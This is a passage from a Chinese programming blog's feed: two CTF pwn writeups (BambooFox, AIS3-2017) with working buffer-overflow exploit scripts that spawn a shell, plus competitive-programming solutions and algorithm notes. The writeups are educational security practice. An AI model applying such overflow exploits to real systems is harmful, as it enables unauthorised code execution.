<span class="keyword">int</span> i;</span><br><span class="line">        srand(time(<span class="literal">NULL</span>));</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">                buf[i] ^= rand()%<span class="number">256</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">magic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> magic_str[<span class="number">60</span>];</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, magic_str);</span><br><span class="line">        do_magic(magic_str, <span class="built_in">strlen</span>(magic_str));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, magic_str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不對do_magic進行繞過，那payload會直接跟亂數XOR變成垃圾QQ</p><p>由呼叫do_magic的地方可知控制XOR的次數是透過strlen()，這個函式會計算字串的字元數，停下來的方法是讀到一個\x00，那我們就提早讓他停下來就好!</p><p>所以payload變成: 0x1個byte + \x00 + (0x44 + 0x4 - 0x2) + never_use()的位置</p><figure class="highlight python"><figcaption><span>Payload.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;bamboofox.cs.nctu.edu.tw&#x27;</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./magic&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(host, port)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;A&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span> * <span class="number">70</span> + p32(<span class="number">0x8048613</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Bamboofox CTF解題記錄，一如往常地到處找題目增進自己打CTF的戰力╰(&lt;em&gt;°▽°&lt;/em&gt;)╯&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://twinklestar03.com/categories/CTF/"/>
    
    
    <category term="Pwn" scheme="https://twinklestar03.com/tags/Pwn/"/>
    
    <category term="Writeup" scheme="https://twinklestar03.com/tags/Writeup/"/>
    
    <category term="BamboofoxCTF" scheme="https://twinklestar03.com/tags/BamboofoxCTF/"/>
    
  </entry>
  
  <entry>
    <title>UVa1584-CircularSequence</title>
    <link href="https://twinklestar03.com/Contest/UVa/UVa1584-CircularSequence/"/>
    <id>https://twinklestar03.com/Contest/UVa/UVa1584-CircularSequence/</id>
    <published>2019-07-14T16:00:00.000Z</published>
    <updated>2020-12-18T07:36:49.682Z</updated>
    
    <content type="html"><![CDATA[<p>關於字典序的應用</p><a id="more"></a><hr><h1 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h1><blockquote><p>長度為N的環狀序列有N種標記法，從某個位置開始順時鐘旋轉得到。<br>從所有標記法中找到字典序最小標記法並印出來該序列。<br>讀入一個長度為N的DNA序列(A, T, C, G)，印出序列的最小標記。</p></blockquote><p><img src="/images/UVa/UVa1584/CircularSeq.png" alt="環狀序列"></p><p>這個序列有多種標記法: CGAGTCAGCT, GAGTCAGCTC, AGTCAGCTCG….。在這些標記法中我們要找到最小標記，也就是字典序最小。</p><h2 id="字典序"><a href="#字典序" class="headerlink" title="字典序"></a>字典序</h2><p>字典序就是字在字典中的順序，兩個字串: “ABC”, “CBA”，一開始先比較字串長度，長度短者字典序小，如果長度相等則從頭開始找不同者，在這例子中為A跟C，A的字典序比C小，所以”ABC”的字典序比”CBA”小。</p><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><figure class="highlight cpp"><figcaption><span>UVa1584.cpp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ ios::sync_with_stdio(false);cin.tie(0);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> seq[<span class="number">101</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 標記法p有沒有比標記法q還要小</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s[(p + i) % N] != s[(q + i) % N])</span><br><span class="line">            <span class="keyword">return</span> s[(p + i) % N] &lt; s[(q + i) % N];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;_</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, seq);</span><br><span class="line">    N = <span class="built_in">strlen</span>(seq);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 逐一列舉標記法，留下最小的</span></span><br><span class="line">    <span class="keyword">int</span> mark = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cmp(seq, i, mark))</span><br><span class="line">            mark = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, seq[(mark + i) % N]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;關於字典序的應用&lt;/p&gt;</summary>
    
    
    
    <category term="Contest" scheme="https://twinklestar03.com/categories/Contest/"/>
    
    <category term="UVa" scheme="https://twinklestar03.com/categories/Contest/UVa/"/>
    
    
    <category term="UVa1584" scheme="https://twinklestar03.com/tags/UVa1584/"/>
    
    <category term="字典序" scheme="https://twinklestar03.com/tags/%E5%AD%97%E5%85%B8%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm::Monotone-Queue/Stack</title>
    <link href="https://twinklestar03.com/Notes/Algorithm-Monotone-Stack/"/>
    <id>https://twinklestar03.com/Notes/Algorithm-Monotone-Stack/</id>
    <published>2019-07-06T16:00:00.000Z</published>
    <updated>2020-12-18T07:32:39.410Z</updated>
    
    <content type="html"><![CDATA[<p>學習筆記-<strong>Monotone-Queue/Stack</strong></p><a id="more"></a><hr><h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>單調列隊-Monotone-Queue/Stack</p><p><strong>單調性</strong>，意思就是該序列內的元素是單調的，例如: {a1, a2, a3, a4, …, an}，其中<strong>滿足a1 &lt;= a2 &lt;= a3 &lt;= … &lt;= an</strong>，此時該序列即是<strong>單調遞增序列</strong>，<strong>單調遞減序列</strong>也是存在的喔!!</p><p><strong>維持單調性</strong>，顧名思義就是要維持序列的單調性，單調遞增序列維持方法:</p><ul><li>如果<strong>序列的長度固定</strong>，則<strong>判斷序列首的元素是否滿足條件</strong>，<strong>不滿足條件則放大序列首</strong></li><li>每次<strong>加入元素時與序列尾</strong>比較，如果<strong>當前元素小於序列尾</strong>，<strong>將序列尾元素依序出列直到滿足條件</strong></li></ul><hr><h1 id="範例問題"><a href="#範例問題" class="headerlink" title="範例問題"></a>範例問題</h1><p><a href="https://zerojudge.tw/ShowProblem?problemid=a813">Zerojudge-a813: 城市觀測</a></p><blockquote><p>有N棟房子。<br>對於任意AB兩棟房子，只要AB中間沒有房子的高度超過A或B，則A可看見B。<br>求1~N每棟房子可看見的房子總數。</p></blockquote><p>測資一，0&lt;N&lt;=300，0&lt;H[i]&lt;=1e5，3/17分<br>測資二，0&lt;N&lt;=5000，0&lt;H[i]&lt;=1e5，3/17分<br>測資三，0&lt;N&lt;=1e6，0&lt;H[i]&lt;=1e9，11/17分</p><blockquote></blockquote><p>範例測資<br>N=2，H={1,1}，ans=1+1=2<br>N=3，H={1,2,3}，ans=1+2+1=4<br>N=5，H={5,2,3,4,4}，ans=4+2+3+3+2=14</p><p>我們其實可以把解法簡化成，<strong>A看的到B，B就看的到A</strong>，所以可以把大樓排成一個由高到低的三角形，每次push值進去stack前都檢查一下有沒有大於stack.top()，有的話就把所有小於該值的元素pop掉，然後Ck+1，因為後面的大樓也都看不到這些被pop掉的元素(Line: 19)</p><figure class="highlight c"><figcaption><span>a813.cpp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ ios::sync_with_stdio(false);cin.tie(0);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> kase, i, b[<span class="number">1000001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;_</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; kase) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; kase; i++)</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; b[i];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; stk, stk2;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; kase; i++) &#123;</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> ck = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (!stk.empty() &amp;&amp; stk.top() &lt; b[i])    <span class="comment">// 維持嚴格遞減</span></span><br><span class="line">                ck += stk2.top(), stk.pop(), stk2.pop(); <span class="comment">// 因為出現比之前更高的大樓，所以i之後的大樓看不到小於i的大樓</span></span><br><span class="line">                                                        <span class="comment">// 就先把可以看到的總數加起來再pop掉</span></span><br><span class="line">            <span class="keyword">if</span> (!stk.empty() &amp;&amp; stk.top() == b[i])      <span class="comment">// 出現同高的大樓，所以只能看到大於b[i]高度的大樓</span></span><br><span class="line">                ck += stk2.top(), stk2.top()++;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                stk.push(b[i]), stk2.push(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (stk.size() &gt; <span class="number">1</span>)                         <span class="comment">// 一定可以看到左邊的大樓，前題是左邊有東西</span></span><br><span class="line">                ck++;</span><br><span class="line">            <span class="comment">// cout &lt;&lt; ck &lt;&lt; &quot; &quot;;</span></span><br><span class="line">            ans += ck;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; ans * <span class="number">2</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;學習筆記-&lt;strong&gt;Monotone-Queue/Stack&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Notes" scheme="https://twinklestar03.com/categories/Notes/"/>
    
    
    <category term="StarNote" scheme="https://twinklestar03.com/tags/StarNote/"/>
    
    <category term="Algorithm" scheme="https://twinklestar03.com/tags/Algorithm/"/>
    
    <category term="MonotoneStack" scheme="https://twinklestar03.com/tags/MonotoneStack/"/>
    
    <category term="MonotoneQueue" scheme="https://twinklestar03.com/tags/MonotoneQueue/"/>
    
    <category term="Stack" scheme="https://twinklestar03.com/tags/Stack/"/>
    
    <category term="Queue" scheme="https://twinklestar03.com/tags/Queue/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm::DynamicProgramming</title>
    <link href="https://twinklestar03.com/Notes/Algorithm-DynamicProgramming/"/>
    <id>https://twinklestar03.com/Notes/Algorithm-DynamicProgramming/</id>
    <published>2019-07-03T16:00:00.000Z</published>
    <updated>2020-12-18T07:32:59.639Z</updated>
    
    <content type="html"><![CDATA[<p>學習筆記-<strong>DynamicProgramming</strong></p><a id="more"></a><hr><p>動態規劃-DynamicProgramming，以下簡稱DP，是一種把大問題細分成小問題的演算法設計方法。</p><p>可以把原問題分解成更多小問題來解決，例如階層: n!源自n-1!…..如此反覆下去可以到1，所以我們是可以慢慢推上來並建個表!</p><hr><h1 id="步驟"><a href="#步驟" class="headerlink" title="步驟"></a>步驟</h1><ol><li>建立足夠大的表格</li><li>推導第 N 項與前 N-1 項的關係。</li><li>將的前面幾項的值寫進去。</li><li>從的最小項次(假設為 M)開始，利用迴圈計算出從第 M 項到第 N 項每一項的值。</li></ol><hr><h1 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h1><p>路徑問題：</p><p>如下圖，有一個 NxN 的方格(N&lt;=10)，我們從左上角的 O (0, 0) 點開始移動，可以移動的方向為：往右、往下、往右下三個方向。現在輸入兩個整數 x、y，請你計算出從 (0, 0) 走到 (x, y) 共有幾種走法。</p><img src="/images/StarNote/DP/square.jpg" class="" title="走格子問題(From sagit C++)"><p>**f(x, y)**當作求走到(x, y)的方法數。</p><p>要求走到<strong>f(x, y)**上的方法數就是</strong>f(x - 1, y) + f(x, y - 1) + f(x - 1, y - 1)**!!</p><p>所以可以依照這樣的規則來建表，之後只要用查詢的就好了!</p><img src="/images/StarNote/DP/square-2.PNG" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">輸入1：3 7</span><br><span class="line"></span><br><span class="line">輸出1：575</span><br><span class="line"></span><br><span class="line">輸入2：10 10</span><br><span class="line"></span><br><span class="line">輸出2：8097453</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    路徑問題：</span></span><br><span class="line"><span class="comment">    有一個 NxN 的方格(N&lt;=10)，我們從左上角的 O (0, 0) 點開始移動，</span></span><br><span class="line"><span class="comment">    可以移動的方向為：往右、往下、往右下三個方向。現在輸入兩個整數 x、y，</span></span><br><span class="line"><span class="comment">    請你計算出從 (0, 0) 走到 (x, y) 共有幾種走法。</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Solution: DP (Bottom-Up)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXM 11</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> vec[MAXM][MAXM];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAXM; i++)</span><br><span class="line">        vec[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAXM; i++)</span><br><span class="line">        vec[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; MAXM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; MAXM; j++) &#123;</span><br><span class="line">            vec[i][j] = vec[i<span class="number">-1</span>][j] + vec[i][j<span class="number">-1</span>] + vec[i<span class="number">-1</span>][j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, vec[x][y]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;學習筆記-&lt;strong&gt;DynamicProgramming&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Notes" scheme="https://twinklestar03.com/categories/Notes/"/>
    
    
    <category term="StarNote" scheme="https://twinklestar03.com/tags/StarNote/"/>
    
    <category term="DynamicProgramming" scheme="https://twinklestar03.com/tags/DynamicProgramming/"/>
    
    <category term="DP" scheme="https://twinklestar03.com/tags/DP/"/>
    
    <category term="Algorithm" scheme="https://twinklestar03.com/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>Uva514-Rail::解題過程</title>
    <link href="https://twinklestar03.com/Contest/UVa/UVa514-Rail/"/>
    <id>https://twinklestar03.com/Contest/UVa/UVa514-Rail/</id>
    <published>2019-06-30T16:00:00.000Z</published>
    <updated>2020-12-18T07:36:54.109Z</updated>
    
    <content type="html"><![CDATA[<p>這題是UVa514-Rail但是我用Zerojudge測，一題小品題~</p><a id="more"></a><hr><h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><hr><p><a href="https://zerojudge.tw/ShowProblem?problemid=c123">點我看題目!</a></p><p>其實這題就是在考Stack，然後模擬Stack的運作，直接上AC Code!</p><figure class="highlight c"><figcaption><span>UVa514.cpp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T) &amp;&amp; (T &amp;&amp; T)) &#123; <span class="comment">// 當輸入為0時跳出</span></span><br><span class="line">        <span class="keyword">int</span> train[T];</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;train[<span class="number">0</span>]) &amp;&amp; (train[<span class="number">0</span>] &amp;&amp; train[<span class="number">0</span>])) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; T; i++) &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;train[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; st; <span class="comment">// 模擬一個Stack</span></span><br><span class="line">            <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= T; i++) &#123; <span class="comment">// 依照1~n的順序push進stack</span></span><br><span class="line">                st.push_back(i);</span><br><span class="line">                <span class="keyword">while</span> (st.size() &amp;&amp; st.back() == train[idx]) &#123;</span><br><span class="line">                    idx++;</span><br><span class="line">                    st.pop_back();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, st.size() ? <span class="string">&quot;No&quot;</span> : <span class="string">&quot;Yes&quot;</span>); <span class="comment">// 如果結束後Stack內還有東西代表這串輸入不合格</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;這題是UVa514-Rail但是我用Zerojudge測，一題小品題~&lt;/p&gt;</summary>
    
    
    
    <category term="Contest" scheme="https://twinklestar03.com/categories/Contest/"/>
    
    <category term="UVa" scheme="https://twinklestar03.com/categories/Contest/UVa/"/>
    
    
    <category term="Stack" scheme="https://twinklestar03.com/tags/Stack/"/>
    
    <category term="UVa514" scheme="https://twinklestar03.com/tags/UVa514/"/>
    
  </entry>
  
  <entry>
    <title>AIS3-2017::Pwn-End解題過程</title>
    <link href="https://twinklestar03.com/Contest/CTF/AIS3_2017_End/"/>
    <id>https://twinklestar03.com/Contest/CTF/AIS3_2017_End/</id>
    <published>2019-06-25T16:00:00.000Z</published>
    <updated>2020-12-18T07:36:20.196Z</updated>
    
    <content type="html"><![CDATA[<p>因為喜歡上Pwn所以想要加強實力，然後就在網路上找找古題來解，希望可以學到點東西!</p><p>在網路上找到了這題AIS3-2017的題目，Pwn-end。</p><a id="more"></a><hr><h2 id="0x01-分析漏洞"><a href="#0x01-分析漏洞" class="headerlink" title="0x01 分析漏洞"></a>0x01 分析漏洞</h2><p>載下來有個ELF Executable，直接拿IDA窺視裡面有甚麼。<br><img src="/images/AIS3_end/disass.png" alt="Disass"></p><p><code>_start</code>是初始化的部分，每個register都被歸零了。</p><p>然後看到<code>_end</code>裡面有開闢一塊0x128的buffer，然後<code>edx = 0x148</code>，之後呼叫了<code>syscall</code>，因為先前的<code>xor rax, rax</code>所以<code>rax=0</code>所以syscall會呼叫到<code>sys_read(0, rsi, 0x148)</code>。</p><p>到這邊漏洞已經探頭了，因為<code>edx = 0x148</code>所以<code>sys_read</code>可以read進0x148個byte，但是開出來的buffer只有0x128個byte，<strong>Stack BufferOverflow Confirm!!</strong></p><hr><h2 id="0x02-建構Payload"><a href="#0x02-建構Payload" class="headerlink" title="0x02 建構Payload"></a>0x02 建構Payload</h2><p>但要怎麼利用這個洞Spawn a shell呢? 在<code>_start</code>中下面還有一個<code>syscall</code>，那應該可以用他來執行<code>sys_execve</code>吧~</p><p>但是….我們可以控制的register只有rsi**(buf)<strong>跟rax</strong>(Function return放rax，所以可以透過控制輸入的字元長度來控制rax)**，但rdi不能控制所以不能正常的執行<code>/bin/sh</code>….</p><p>回頭爬爬Syscall table，發現有一個性質接近也可以執行檔案的函數<code>stub_execveat(int dfd, const char __user *filename, const char __user *const __user *argv, const char __user*const __user *envp, int flags)</code></p><p>Hey!這樣子好像行得通，<code>*filename</code>這參數可以控制了因為他吃的是rsi，然後呼叫他的方法是把rax設定成322，所以<strong>輸入字串長度要是322</strong>，<strong>但是要注意要把rdx清空，不然會爛掉。</strong></p><p>把rdx清空不難，在_start前面有<code>xor rdx, rdx</code>，Stack都可以被<del>灌滿了///</del>跳過去就不是問題了。</p><p>所以輸入要是<code>/bin/sh\x00</code> + 塞0x120個byte來填buf + <code>xor rdx rdx</code>的address + 更多垃圾byte來湊長度。</p><hr><h2 id="0x03-生成Payload"><a href="#0x03-生成Payload" class="headerlink" title="0x03 生成Payload"></a>0x03 生成Payload</h2><figure class="highlight python"><figcaption><span>exploit.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">padding = <span class="string">&#x27;A&#x27;</span> * (<span class="number">296</span> - <span class="number">8</span>) <span class="comment"># 填剩下來的buf</span></span><br><span class="line">xor_rdx_rdx = <span class="string">&#x27;\xed\x00\x40\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">print(filename + padding + (xor_rdx_rdx)*<span class="number">3</span> + <span class="string">&#x27;\x41&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="0xFF-結語"><a href="#0xFF-結語" class="headerlink" title="0xFF 結語"></a>0xFF 結語</h2><p>原本是剛學到rop的概念，想要拿題目來練習，找著找著找到這題，覺得做法很有趣就記錄下來了w</p><p>成功get shell的時候總是很開心呢w (ﾉ∀`*)</p>]]></content>
    
    
